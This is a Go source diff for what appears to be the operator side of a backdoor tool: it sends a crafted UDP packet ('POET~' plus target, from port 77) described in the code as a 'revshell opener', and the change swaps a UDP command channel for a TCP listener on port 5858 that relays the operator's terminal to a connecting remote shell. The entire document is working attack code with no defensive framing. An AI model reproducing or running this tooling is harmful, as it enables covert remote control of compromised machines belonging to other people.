@@ -4,19 +4,17 @@ import (
 	"errors"
 	"flag"
 	"fmt"
+	"io"
+	"log"
 	"net"
 	"os"
 	"syscall"
-	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 )
 
-const (
-	CONN_PORT = "5858"
-	CONN_TYPE = "udp"
-)
+// quill logo
 
 func GetInterfaceIpv4Addr(interfaceName string) (addr string, err error) {
 	var (
@@ -95,20 +93,8 @@ func sendUDPPacket(iFace string, source string, target string, command string, s
 		IP:   net.ParseIP(target),
 		Port: dport,
 	}
-	if sport != 77 {
-		for _, c := range command {
-			udpHelper(conn, dst, source, sport, string(c)) // send char by char
-		}
-		udpHelper(conn, dst, source, sport, "\n") // send newline char
-	} else {
-		udpHelper(conn, dst, source, sport, command) // send revshell opener
-	}
-	return
-}
-
-func udpHelper(conn net.PacketConn, dst *net.UDPAddr, source string, sport int, data string) {
-	fmt.Printf("Data: %s\n", data)
-	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(source), Port: sport}, data)
+	fmt.Printf("Data: %s\n", command)
+	b, err := buildUDPPacket(dst, &net.UDPAddr{IP: net.ParseIP(source), Port: sport}, command)
 	if err != nil {
 		panic(err)
 	}
@@ -116,31 +102,55 @@ func udpHelper(conn net.PacketConn, dst *net.UDPAddr, source string, sport int, 
 	if err != nil {
 		panic(err)
 	}
+
+	return
 }
 
-func readBuffer(pc net.PacketConn, addrChan chan net.Addr) {
-	buffer := make([]byte, 2048)
-	for {
-		numBytesRead, addr, err := pc.ReadFrom(buffer)
-		if err != nil {
-			panic(err)
-		}
-		fmt.Printf("ALL-BUFFER: %s\n", string(buffer)) // DEBUG
-		if numBytesRead > 1 {
-			fmt.Printf("MAIN-BUFFER: %s\n", string(buffer)) // print output
-			addrChan <- addr
-		} else {
-			fmt.Printf("DEL: %s\n", string(buffer))
-		}
-		buffer = buffer[:0] // zero out buffer each time
-
+func tcp_con_handle(con net.Conn) {
+	chan_to_stdout := stream_copy(con, os.Stdout)
+	chan_to_remote := stream_copy(os.Stdin, con)
+	select {
+	case <-chan_to_stdout:
+		log.Println("Remote connection is closed")
+	case <-chan_to_remote:
+		log.Println("Local program is terminated")
 	}
+}
+
+// Performs copy operation between streams: os and tcp streams
+func stream_copy(src io.Reader, dst io.Writer) <-chan int {
+	buf := make([]byte, 1024)
+	sync_channel := make(chan int)
+	go func() {
+		defer func() {
+			if con, ok := dst.(net.Conn); ok {
+				con.Close()
+				log.Printf("Connection from %v is closed\n", con.RemoteAddr())
+			}
+			sync_channel <- 0 // Notify that processing is finished
+		}()
+		for {
+			var nBytes int
+			var err error
+			nBytes, err = src.Read(buf)
+			if err != nil {
+				if err != io.EOF {
+					log.Printf("Read error: %s\n", err)
+				}
+				break
+			}
+			_, err = dst.Write(buf[0:nBytes])
+			if err != nil {
+				log.Fatalf("Write error: %s\n", err)
+			}
+		}
+	}()
+	return sync_channel
 }
 
 func main() {
 	var iFace string
 	var source string
-	var command string
 	var target string
 
 	iFace, ok := os.LookupEnv("IFACE")
@@ -167,41 +177,16 @@ func main() {
 	opener := "POET~" + target
 	sendUDPPacket(iFace, source, target, opener, 77, 7714)
 
-	pc, err := net.ListenPacket("udp", source+":"+CONN_PORT)
+	listener, err := net.Listen("tcp", ":5858") // TODO change port
 	if err != nil {
-		panic(err)
-		return
+		log.Fatalln(err)
 	}
-	defer pc.Close()
 
-	addrChan := make(chan net.Addr, 1)
-
-	go readBuffer(pc, addrChan)
-	for {
-		select {
-		case <-addrChan:
-			fmt.Printf("in addrchan\n")
-			addr := <-addrChan
-			dport := addr.(*net.UDPAddr).Port
-
-			deadline := time.Now().Add(60 * time.Second)
-			err = pc.SetWriteDeadline(deadline)
-			if err != nil {
-				return
-			}
-
-			fmt.Print("Command: ")
-			fmt.Scanf("%s", &command)
-			if command == "exit" {
-				return
-			}
-
-			sendUDPPacket(iFace, source, target, command, 5858, dport)
-
-			addrChan <- nil
-		default:
-			time.Sleep(1 * time.Second) // do nothing
-		}
+	con, err := listener.Accept()
+	if err != nil {
+		log.Fatalln(err)
 	}
-	return
+	log.Println("Connect from", con.RemoteAddr())
+
+	tcp_con_handle(con)
 }
